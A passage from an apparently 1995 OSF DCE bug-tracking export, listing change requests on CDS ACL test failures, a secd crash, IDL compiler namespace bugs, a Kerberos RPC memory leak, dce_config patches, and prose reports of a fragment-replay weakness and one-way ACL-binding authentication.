Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/25/95 public]

cds functional tests dacl_read and dacl_replica fail:

dacl_read log file (sections which show failures): 
#
# cdscp
#
cdscp show child /.:/dacl_reads/dir1

                        SHOW
                       CHILD   /.../knuckle_f920/dacl_reads/dir1
                          AT   1995-09-29-15:05:47
Error on entity: /.../knuckle_f920/dacl_reads/dir1
Insufficient rights to perform requested operation
Function: dnsEnumAttr

cdscp show obj /.:/dacl_reads/obj1

                        SHOW
                      OBJECT   /.../knuckle_f920/dacl_reads/obj1
                          AT   1995-09-29-15:05:49
Error on entity: /.../knuckle_f920/dacl_reads/obj1
Insufficient rights to perform requested operation
Function: dnsEnumAttr

cdscp show link /.:/dacl_reads/lnk1

                        SHOW
                    SOFTLINK   /.../knuckle_f920/dacl_reads/lnk1
                          AT   1995-09-29-15:05:50
Error on entity: /.../knuckle_f920/dacl_reads/lnk1
Insufficient rights to perform requested operation
Function: dnsEnumAttr

#
# cdscp
#
cdscp set dir /.:/dacl_reads to skulk
cdscp set dir /.:/dacl_reads/dir1 to skulk
cdscp show dir /.:/dacl_reads

                        SHOW
                   DIRECTORY   /.../knuckle_f920/dacl_reads
                          AT   1995-09-29-15:05:56
Error on entity: /.../knuckle_f920/dacl_reads
Insufficient rights to perform requested operation
Function: dnsEnumAttr

cdscp show child /.:/dacl_reads/dir1

                        SHOW
                       CHILD   /.../knuckle_f920/dacl_reads/dir1
                          AT   1995-09-29-15:05:57
Error on entity: /.../knuckle_f920/dacl_reads/dir1
Insufficient rights to perform requested operation
Function: dnsEnumAttr

cdscp show obj /.:/dacl_reads/obj1

                        SHOW
                      OBJECT   /.../knuckle_f920/dacl_reads/obj1
                          AT   1995-09-29-15:05:58
Error on entity: /.../knuckle_f920/dacl_reads/obj1
Insufficient rights to perform requested operation
Function: dnsEnumAttr


dacl_replica log file: 
Error on entity: /.../knuckle_f920/dacl_ch2_dir950929191114
Insufficient rights to perform requested operation
Function: dnsCreateDir

ERROR: acl object not found (dce / sec)
Unable to bind to object /.:/dacl_ch2_dir950929191114
Error on entity: /.../knuckle_f920/dacl_ch2_dir950929191114
Requested entry does not exist
Function: dnsDelDir
dnsDelDir: partial results = /.../knuckle_f920

HOSTNAME = HOSTNAME
#
# acl_edit
#
acl_edit /.:/ch1 -m user:notroot:wc
acl_edit /.:/ch2 -m user:notroot:c
ERROR: Not an RPC entry (dce / rpc)
Unable to bind to object /.:/ch2

Creates top level directory first

#
# cdscp
#
cdscp set dir /.: to skulk
cdscp create dir /.:/dacl_replicas950929191114 clear /.:/ch1
cdscp set dir /.: to skulk
cdscp set dir /.:/dacl_replicas950929191114 to skulk

Set access to everything but admin and expect all to fail

#
# acl_edit
#
acl_edit /.:/dacl_replicas950929191114 -s user:notroot:rwditc
#
# cdscp
#
cdscp create replica /.:/dacl_replicas950929191114 clea /.:/ch2
Error on entity: /.../knuckle_f920/dacl_replicas950929191114
Insufficient rights to perform requested operation
Function: dnsAddReplica

cdscp set dir /.:/dacl_replicas950929191114 to new epoch mast /.:/ch1
Error on entity: /.../knuckle_f920/dacl_replicas950929191114
Insufficient rights to perform requested operation
Function: dnsNewEpoch

cdscp set dir /.: to skulk
cdscp set dir /.:/dacl_replicas950929191114 to skulk

Set access to admin and expect failure - server doesn't have access

#
# acl_edit
#
acl_edit /.:/dacl_replicas950929191114 -s user:notroot:rac
#
# cdscp
#
cdscp create replica /.:/dacl_replicas950929191114 clea /.:/ch2
Error on entity: /.../knuckle_f920/dacl_replicas950929191114
Insufficient rights to perform requested operation
Function: dnsAddReplica


Set server access to rwa but still expect create to fail

#
# acl_edit
#
acl_edit /.:/dacl_replicas950929191114 -m user:hosts/HOSTNAME/cds-server:rwa
user:hosts//cds-server - SEC_ACL_EDIT - invalid or unknown entry key (dce / sad)
#
# cdscp
#
cdscp create replica /.:/dacl_replicas950929191114 clea /.:/ch2
Error on entity: /.../knuckle_f920/dacl_replicas950929191114
Insufficient rights to perform requested operation
Function: dnsAddReplica


Add write for user to clear - should work

#
# acl_edit
#
acl_edit /.:/ch2 -m user:notroot:wrc
ERROR: Not an RPC entry (dce / rpc)
Unable to bind to object /.:/ch2
acl_edit /.:/ch1 -m user:hosts/HOSTNAME/cds-server:
user:hosts//cds-server - SEC_ACL_EDIT - invalid or unknown entry key (dce / sad)
#
# cdscp
#
cdscp create replica /.:/dacl_replicas950929191114 clea /.:/ch2
Error on entity: /.../knuckle_f920/dacl_replicas950929191114
Insufficient rights to perform requested operation
Function: dnsAddReplica

cdscp set dir /.: to skulk
cdscp set dir /.:/dacl_replicas950929191114 to skulk
cdscp set dir /.:/dacl_replicas950929191114 to new epoch mast /.:/ch1 read /.:/ch2
Error on entity: /.../knuckle_f920/dacl_replicas950929191114
Specified clearinghouse does not contain a copy of the directory
Function: dnsNewEpoch


New epoch should fail changing masters

cdscp set dir /.:/dacl_replicas950929191114 to new epoch mast /.:/ch2 read /.:/ch1
Error on entity: /.../knuckle_f920/dacl_replicas950929191114
Specified clearinghouse does not contain a copy of the directory
Function: dnsNewEpoch


Set server access so new epoch changing masters succeeds


acl_edit /.:/ch1 -m user:hosts/HOSTNAME/cds-server:wc
user:hosts//cds-server - SEC_ACL_EDIT - invalid or unknown entry key (dce / sad)
#
# cdscp
#
cdscp set dir /.:/dacl_replicas950929191114 to new epoch mast /.:/ch2 read /.:/ch1
Error on entity: /.../knuckle_f920/dacl_replicas950929191114
Specified clearinghouse does not contain a copy of the directory
Function: dnsNewEpoch


Set access to everything but admin and expect remove to fail

#
# acl_edit
#
acl_edit /.:/dacl_replicas950929191114 -m user:notroot:rwdtic
acl_edit /.:/ch1 -m user:notroot:c
#
# cdscp
#
cdscp delete replica /.:/dacl_replicas950929191114 clear /.:/ch1
Error on entity: /.../knuckle_f920/dacl_replicas950929191114
Requested entry does not exist
Function: dnsRmReplica
dnsRmReplica: partial results = %x000000000000000000000000000000000000


Set access to admin, but still fails cause of clearinghouse access

#
# acl_edit
#
acl_edit /.:/dacl_replicas950929191114 -m user:notroot:rac
#
# cdscp
#
cdscp delete replica /.:/dacl_replicas950929191114 clear /.:/ch1
Error on entity: /.../knuckle_f920/dacl_replicas950929191114
Requested entry does not exist
Function: dnsRmReplica
dnsRmReplica: partial results = %x000000000000000000000000000000000000


Set clear access - should work

#
# acl_edit
#
acl_edit /.:/ch1 -m user:notroot:wc
#
# cdscp
#
acl_edit /.:/dacl_replicas950929191114 -m user:notroot:rwdtac
cdscp delete repclica /.:/dacl_replicas950929191114 clearinghouse /.:/ch1
Error on entity: /.../knuckle_f920/dacl_replicas950929191114
Requested entry does not exist
Function: dnsRmReplica
dnsRmReplica: partial results = %x000000000000000000000000000000000000

cdscp delete directory /.:/dacl_replicas950929191114



CR Number                     : 13159
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000,hppa
S/W Ref Platform              : aix,hpux
Component Name                : dced
Subcomponent Name             : server stop
Short Description             : servr stop -method rpc causes secd segv
Reported Date                 : 10/23/95
Found in Baseline             : 1.1
Found Date                    : 10/23/95
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/admin/dced/api/dced_server.c
Sensitivity                   : public

[10/23/95 public]

I was running the dcecp server ping tests in order to verify a fix
for OT 12834, and noticed that the last ic of server_ping_P.tcl did
a server stop -method rpc which caused secd to do the following

 Dumping core after receiving signal SIGSEGV

I used the debugger to trace the execution of dcecp and it appeared as
if the stack had been corrupted, and that when dced_server_stop was
execueted, that the uuid comparison for "all_services" passed causing
the shutdown all of dce rpc to be issued.

The problem also exists on the HP, but the consequence is less serious.
On the HP, the following error message appearss in the dcecp session.

dcecp> stop server tserver -method rpc
Error: Unknown message number 0x14129007
dcecp>

REPEAT BY:

install the dcecp server functional tests
run ic4 of server_ping_P.tcl



CR Number                     : 13158
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : dg authn
Short Description             : datagram protocol vulnerable
	to within-call replays if fragnos wrap
Reported Date                 : 10/20/95
Found in Baseline             : 1.0
Found Date                    : 10/20/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/20/95 public]

The authentication used by the RPC datagram protocol is vulnerable to
replays if fragment numbers wrap around.  This happens after 2^16 packets
(~2^26 bytes) of data, and the vulnerability is that an attacker could
substitute an earlier fragment in place of the "correct" one.

Fixing this requires a protocol change, but the change need not be visible
to calls which send less than 2^16 fragments.

This is a C2 because the workaround is "don't do that" :-).

[10/23/95 public]

From AES, 12.5.1 Connectionless PDU Structure:

 If fragment numbers wrap around and are reused, the implementation must
 assure that these are unambiguous (for example, the first 50% of fragments
 must have been acknowledged).

So, I think that the attacker can't replace earlier fragments because
replays (acknowledged fragments) are dropped. Am I missing something here?

[10/23/95 public]

Oh, I got it. The attacker just resends an old fragment. Hmm, quite
interesting to see a sender's behavior if a serial number in a fack doesn't
match...



CR Number                     : 13150
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl_compiler
Short Description             : field and structure name problem
Reported Date                 : 10/11/95
Found in Baseline             : 1.1
Found Date                    : 10/11/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/11/95 public]
 { Please note the Interest list above. }

According to the AES, section 4.2.1.2.1 the following should work:
    interface t1a
    {
      typedef enum {foo} baz;

      typedef struct {
	long foo;
      } bar;
    }

But it doesn't.  Reversing the order works:
    interface t1b
    {
      typedef struct {
	long foo;
      } bar;

      typedef enum {foo} baz;
    }

[10/11/95 public]

>It appears that the IDL compiler gives a (spurious IHMO) error when
>you declare an operation, struct or union after a constant, enumeration
>or operation, where the name of a param, field or arm (respectively)
>of the former overloads the identifier for the latter.  Examples
>are in the attached test file.
>
>Also it appears that the IDL compiler does not check that a union's
>discriminator name and union name are not the same (at least in the
>parse phase).  I think this will lead to C compilation errors if not
>picked up.

More field/struct-union-enum namespace problems:

interface t1a
{

/* struct field overloads enum identifier */
  typedef enum {n1} E1;

  typedef struct {
    long n1;
  } S1;


/* enum identifier overloads struct field */
  typedef struct {
    long n2;
  } S2;

  typedef enum {n2} E2;


/* struct tag name overloads enum identifier */
  typedef enum {n3} E3;

  typedef struct n3 {
    long f3;
  } S3;


/* enum identifier overloads struct tag name */
  typedef struct n4 {
    long f4;
  } S4;

  typedef enum {n4} E4;


/* param overloads enum identifier */
  typedef enum {n5} E5;

  void Op5([in] long n5);


/* enum identifier overloads param */
  void Op6([in] long n6);

  typedef enum {n6} E6;


/* Op overloads enum identifier */
  typedef enum {n7} E7;

  void n7([in] long a7);    /* ERROR expected here */


/* enum identifier overloads Op */
  void n8([in] long a8);

  typedef enum {n8} E8;     /* ERROR expected here */


/* typedef overloads enum identifier */
  typedef enum {n9} E9;

  typedef long      n9;     /* ERROR expected here */

/* enum identifier overloads typedef */
  typedef long      n10;     

  typedef enum {n10} E10;   /* ERROR expected here */


/* Constant identifier overloads struct field */
  const long n11 = 1;

  typedef struct {
    long n11;
  } S11;


/* struct field overloads constant identifier */
  typedef struct {
    long n12;
  } S12;

  const long n12 = 1;


/* Constant identifier overloads param */
  const long n13 = 1;

  void Op13([in] long n13);


/* param overloads constant identifier */
  void Op14([in] long n14);

  const long n14 = 1;


/* Operation overloads struct field */
  typedef struct {
    long n15;
  } S15;

  void n15([in] long a15);


/* Struct field overloads operation */
  void n16([in] long a16);

  typedef struct {
    long n16;
  } S16;


/* Param overloads struct field */
  typedef struct {
    long n17;
  } S17;

  void Op17([in] long n17);


/* Struct field overloads param */
  void Op18([in] long n18);

  typedef struct {
    long n18;
  } S18;


/* Enum identifier has same name as typedef */
  typedef enum {E19} E19;        /* ERROR expected here */


/* struct tag overloads union tag */
  typedef union n20 switch (short s20) {
    case 1: long a20;
  } U20;

  typedef struct n20 {           
    long f20;
  } S20;                         /* ERROR expected here */


/* Enum identifier overloads union arm */
  typedef union t21 switch (short s21) {
    case 1: long n21;
  } U21;

  typedef enum {n21} E21;


/* Union arm overloads Enum identifier  */
  typedef enum {n22} E22;

  typedef union t22 switch (short s22) {
    case 1: long n22;
  } U22;


/* Union arm overloads union switch */
  typedef union t23 switch (short n23) {
    case 1: long n23;
  } U23;


/* Union name overloads union switch */
  typedef union t24 switch (short n24) n24 {
    case 1: long a24;
  } U24;                    /* ERROR expected here */
}



CR Number                     : 13147
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : secd
Short Description             : rs_replist_read may fail to set output parameter *n_ents
Reported Date                 : 10/7/95
Found in Baseline             : 1.1wp
Found Date                    : 10/7/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : security/server/rs/rs_replist.c
Sensitivity                   : public

[10/7/95 public]

Customer reported:


rs_replist_read does not set the output parameter *n_ents when the
"BEGIN_READ" check fails. The rpc runtime proceeds to marshal the
response using the fault *n_ents value.  Compare the following
code with rs_replist_read_full().
- - - - -

void  rs_replist_read
  (
    handle_t            h,          /* [in] */
    uuid_t              *marker,    /* [in, out] */
    unsigned32          max_ents,   /* [in] */
    unsigned32          *n_ents,    /* [out] */
    rs_replica_item_t   replist[],  /* [out, length_is(*n_ents), size_is(max_ent
s)] */
    error_status_t      *st
  )
{

    BEGIN_READ(lock_replist, st) {

        rs_replist2_read(marker, max_ents, n_ents, replist, st);

    } END_READ

}

- - - -

Repeat By:


Proposed Solution:

Preset *n_ents to zero.
- - - - -

    *n_ents = 0;
    BEGIN_READ(lock_replist, st) {

        rs_replist2_read(marker, max_ents, n_ents, replist, st);

    } END_READ

[11/16/95 public]
Fix submitted to 1.1maint tree.



CR Number                     : 13143
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13142
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : fix malloc/free wrappers
Reported Date                 : 10/4/95
Found in Baseline             : 1.2
Found Date                    : 10/4/95
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/4/95 public]

As part of the XIDL integration it was realized/decided that idl_size_t
must be a typedef for the local size_t datatype.  To aid portability
and reduce confusion we want to replace all idl_size_t's with size_t
wherever possible.  This will make it unnecessary to have "wrappers"
around malloc and free.  There are some in the sec code, that can
be removed.  (Some wrappers that is.)



CR Number                     : 13136
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : 
Short Description             : fails functional test zonecvt, dtsdate
Reported Date                 : 10/3/95
Found in Baseline             : 1.2.1
Found Date                    : 09/22/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/3/95 public]



CR Number                     : 13135
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12901
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cdsd
Short Description             : Upgrading the CDS_DirectoryVersion attribute for a clearinghouse
Reported Date                 : 10/2/95
Found in Baseline             : 1.1
Found Date                    : 10/2/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/2/95 public]

As things currently stand, when a new DCE 1.1 CDS server is configured
via dce_config, the initial clearinghouse (<machine>_ch) will be created
with a CDS_DirectoryVersion attribute that has a default value of 3.0.
Unfortunately, since there is no documented way to modify the values of
clearinghouse attributes, it will _always_ have this value.  Here's the
situation:

	(1) At present there is no way (at least using our dce_config)
	to configure a new DCE 1.1 CDS server with an initial 
	clearinghouse for which CDS_DirectoryVersion defaults to 4.0.
	A CR (#12901) has already been filed requesting this change.

	(2) It is possible to start up cdsd with a flag "-v 4.0" (see
	CR #12161).  This will cause any _new_ clearinghouses to have a 
	default value of 4.0 for CDS_DirectoryVersion, but has no
	effect on the _existing_ clearinghouses.

	(3) If dce_config were to make use of the aformentioned cdsd
	flag, it could possibly solve this problem for the _initial_
	clearinghouse, but not for any other pre-existing 
	clearinghouses with a CDS_DirectoryVersion of 3.0.

	(4) Given that cells which are in transition between DCE 1.0.x
	and DCE 1.1 might well contain 1.1 CDS servers with
	clearinghouses that were initialized with CDS_DirectoryVersion
	3.0, it seems desirable that there should be some reasonably
	convenient mechanism for upgrading these clearinghouses to a
	default level of 4.0.  Whether this is accomplished by adding
	a "clearinghouse modify" command to dcecp (which carries some
	risks) or by making the clearinghouse upgrade part of the code
	for propagating root directory upgrades via the background
	process is obviously a design question.

Why should this matter?  Because even if the root directory is upgraded
to CDS_DirectoryVersion 4.0, even if cdsd is started up with the "-v 4.0"
flag, since the initial (and typically default) clearinghouse remains at 
3.0, every new directory created which does not explicitly have its
master replica created in a 4.0-level clearinghouse will by default
start out with a CDS_DirectoryVersion of 3.0.  This value will persist
until either the new directory is deliberately upgraded or until the
background process does the job for it (assuming root is at 4.0).

This may not be an issue now, but when cell aliasing and hierarchical
cells become functional, the transient existence of 3.0-level 
directories could potentially pose some problems.



CR Number                     : 13131
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : sams
Short Description             : flag for generating short filenames
Reported Date                 : 10/1/95
Found in Baseline             : 1.1
Found Date                    : 10/1/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/1/95 public]

In the interests of portability to some operating systems, sams should
have a standard flag on all ports that means "generate filenames that
fit into an 8.3 naming scheme."  The consensus is to use the -l flag,
for littler filenames I suppose.

If either IBM or Gradient update the OT with the fix, then someone should
open a doc defect.

[7/18/96 public]

Haven't seen any response from interested parties. Marking it an enhancement
request.



CR Number                     : 13129
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : Cdsalias connect shouldn't req GDA
Reported Date                 : 9/21/95
Found in Baseline             : 1.1
Found Date                    : 7/11/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/21/95 public]

The GDA should not be required for the dcecp cdsalias connect command to      
succeed.  As long as the parent cell can be located from the child cell by
using cdscp define cached server or dcecp csdcache create, the command
should succeed.  This is helpful for non-TCP/IP protocols where DNS is not
supported and a GDA cannot be used.



CR Number                     : 13115
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : dced
Subcomponent Name             : server
Short Description             : Pass status to waiting for something message
Reported Date                 : 9/11/95
Found in Baseline             : 1.1
Found Date                    : 9/11/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/11/95 public]

SVR4 porting changes from support customer:

Client Software:        Unixware 2.0

*** /animal/build/dce1.1/src/./admin/dced/server/main.c	Thu Dec 15 14:25:29 1994
--- ./admin/dced/server/main.c	Tue May  2 12:06:36 1995
***************
*** 8,17 ****
  /*
   * HISTORY
   * $Log:	c013115,v $
# Revision 1.1  95/09/11  15:50:44  root
# new CR
# 
   * Revision 2.1.2.1  1994/12/15  19:23:29  tom
   * 	DCE 1.1 Unintegrated source from OSF
   * 	[1994/12/15  17:50:18  tom]
!  *
   * Revision 1.1.4.1  1994/10/26  19:54:40  rsalz
   * 	Add rpc_ss_enable_allocate call to signal_catcher (OT CR 12714?).
   * 	Call srvrexec_init for kill(2)-based pinging.
--- 8,20 ----
  /*
   * HISTORY
   * $Log:	c013115,v $
# Revision 1.1  95/09/11  15:50:44  root
# new CR
# 
+  * Revision 2.1.3.2  1995/05/02  16:06:32  tomj
+  * 	Pass status to waiting for something message.
+  *
   * Revision 2.1.2.1  1994/12/15  19:23:29  tom
   * 	DCE 1.1 Unintegrated source from OSF
   * 	[1994/12/15  17:50:18  tom]
!  * 
   * Revision 1.1.4.1  1994/10/26  19:54:40  rsalz
   * 	Add rpc_ss_enable_allocate call to signal_catcher (OT CR 12714?).
   * 	Call srvrexec_init for kill(2)-based pinging.
***************
*** 374,380 ****
  		&thishost_prin_uuid, st);
  	if (*st == error_status_ok)
  	    break;
! 	dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG, "machine principal");
  	dced_sleep(10);
      }
  
--- 381,387 ----
  		&thishost_prin_uuid, st);
  	if (*st == error_status_ok)
  	    break;
! 	dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG, "machine principal", *st);
  	dced_sleep(10);
      }
  
***************
*** 387,393 ****
  	    sec_key_mgmt_free_key(key, st);
  	    break;
  	}
! 	dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG, "machine keytab");
  	dced_sleep(10);
      }
  
--- 394,400 ----
  	    sec_key_mgmt_free_key(key, st);
  	    break;
  	}
! 	dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG, "machine keytab", *st);
  	dced_sleep(10);
      }
  
***************
*** 412,418 ****
  	    rpc_c_authn_dce_secret, NULL, NULL, st);
  	if (*st == error_status_ok)
  	    break;
! 	dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG, "rpc_server_register_auth_info");
  	dced_sleep(10);
      }
  }
--- 419,425 ----
  	    rpc_c_authn_dce_secret, NULL, NULL, st);
  	if (*st == error_status_ok)
  	    break;
! 	dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG, "rpc_server_register_auth_info", *st);
  	dced_sleep(10);
      }
  }



CR Number                     : 13114
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : memleak in rpc__krb_bnd_set_auth()
Reported Date                 : 9/11/95
Found in Baseline             : 1.1wp
Found Date                    : 9/11/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : krbclt.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/11/95 public]

From email sent by Steve Lord:

We recently had a problem with a space leak in KRPC at a customer site -
they triggered it by changing some IP addresses whilst the system was
running, but I suspect it can happen in other ways to.

The problem is in rpc__krb_bnd_set_auth in the krbclt.c module. If this
function fails (which has to be caused by a failure return from
rpc__krb_get_tkt), then the rpc_krb_info_p_t structure it allocates is
lost. This is because it does not free it on a failure and the caller 
rpc__dg_execute_call ignores the returned pointer in failure cases.

One was to fix it is to add some free code to the end of
rpc__krb_bnd_set_auth(), something like this should do it:


    if (level != rpc_c_authn_level_none)
    {
        st = rpc__krb_get_tkt (krb_info);
        if (st != rpc_s_ok)
            goto poison;
    }
    st = rpc_s_ok;
poison:
    /* If we failed then free krb_info, otherwise return it to caller */
    if (st != rpc_s_ok) {
        RPC_KRB_INFO_UNLOCK(krb_info);
        rpc__krb_free_info((rpc_auth_info_p_t *) &krb_info);
        *infop = NULL;
    } else {
        *infop = (rpc_auth_info_p_t) &krb_info->auth_info;
        RPC_KRB_INFO_UNLOCK(krb_info);
        krb_info->status = st;
    }
    *stp = st;
    return;
}

This bug seems to be common to user space and the kernel.

The latest code we have is the 1.1 Warranty release, the bug is still
present there.

Steve Lord

------------------------------------------------------------------------------
Steve Lord					voice: +1-612-683-5291
Cray Research Inc				email: lord@cray.com
655F Lone Oak Drive
Eagan, MN, 55121, USA
------------------------------------------------------------------------------

[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13104
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dce_config
Short Description             : config_client() does not test
for symlink install of dce
Reported Date                 : 9/7/95
Found in Baseline             : 1.1
Found Date                    : 9/7/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/7/95 public]

client_config() fails to detect dce installation if it
was installed by symlink.  The fix consist in testing
for the symlink and was included in the customer's report.

The problem is still present in the 1.2 dce_config.

> 
>  
>      *** /tmp/ci.8416..dce_config.8459.1	Wed Jul  5 17:05:41 1995
>      --- /tmp/dce_config.8459.2	Wed Jul  5 17:05:41 1995
>      ***************
>      *** 7328,7338 ****
>        config_client()
>        {
>           log_msg DEBUG "Executing: config_client()"
>           # Ensure libdce.a is installed on this node. If it
>           # isn't, force the user to do an install_common()
>      !    if [ ! -f $DCELOCAL/$SHLIB_RDN/libdce${SHLIB_SUF} -a ! -f
> $DCELOCAL/lib/libdce.a ]
>           then
>        	err_exit "The DCE Client installation must be run prior to client
> configuration. "
>        	return
>           else
>        
>      --- 7328,7338 ----
>        config_client()
>        {
>           log_msg DEBUG "Executing: config_client()"
>           # Ensure libdce.a is installed on this node. If it
>           # isn't, force the user to do an install_common()
>      !    if [ ! -f $DCELOCAL/$SHLIB_RDN/libdce${SHLIB_SUF} -a ! -f
> $DCELOCAL/lib/libdce.a -a ! -L $DCELOCAL/lib/libdce.a ]  #hitm
>           then
>        	err_exit "The DCE Client installation must be run prior to client
> configuration. "
>        	return
>           else
>



CR Number                     : 13102
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : erarel001 fails-unable to delete schema
Reported Date                 : 9/6/95
Found in Baseline             : 1.2
Found Date                    : 8/31/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/6/95 public]

System test erarel001 fails with the following errors: 

ERROR: Unable to remove all objects in del_obj() for ibm_l3
ERROR: Schema /.:/sec/xattrschema/sestribm_l4aibm_l3 was not
 deleted from registry as expected in delete_schema
ERROR: Unable to remove all objects in del_obj() for ibm_l4



CR Number                     : 13087
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : acl binding
Short Description             : one-way auth is insecure
Reported Date                 : 8/31/95
Found in Baseline             : 1.0
Found Date                    : 8/31/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/31/95 public]

There are some mis-features in the way sec_acl_bind & friends (bind_to_addr,
etc) work.  It's not clear if they are bugs, representative of bigger
overall issues, or if there are reasonable work-arounds.  I am sure that
some of this could/should be split into separate OT's, but as there is
at least one real security bug I'm going to open this OT and fill it with
all I know.

On the one hand we constantly say that CDS isn't part of the TCB, 
yet sec_acl_bind uses CDS.  Perhaps we need to document (and reinforce)
better how to use sec_acl_bind_to_addr.

More importantly, the authentication is only one-way.  The client is
authenticated to the server.  The client has no way of knowing that it is
talking to the right server, because the acl binding code calls rpc...inq_name
itself, rather then providing an API that lets the client name who it expects
to have on the other side.

There might be other places in DCE where one-way auth is used, arguably broken.

[02/02/96 public]
Looking back, "arguably broken" seems a little harsh.  This is really
asking for new functionality.  Made an enhancement.



CR Number                     : 13086
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 10458
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : removal of rpc__cn_call_local_cancel() causes server hangs
Reported Date                 : 8/30/95
Found in Baseline             : 1.1
Found Date                    : 7/24/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnassoc.c
Sensitivity                   : public

[8/30/95 public]

(from warnick@hi.com)
 DESCRIPTION:
 
 We have been experiencing frequent hangs in rpc__cn_assoc_receive_frag()
 waiting on an event which is never received.  The server doesn't receive 
 cancellation notification from the client and doesn't setup a cancel 
 timeout.  
 
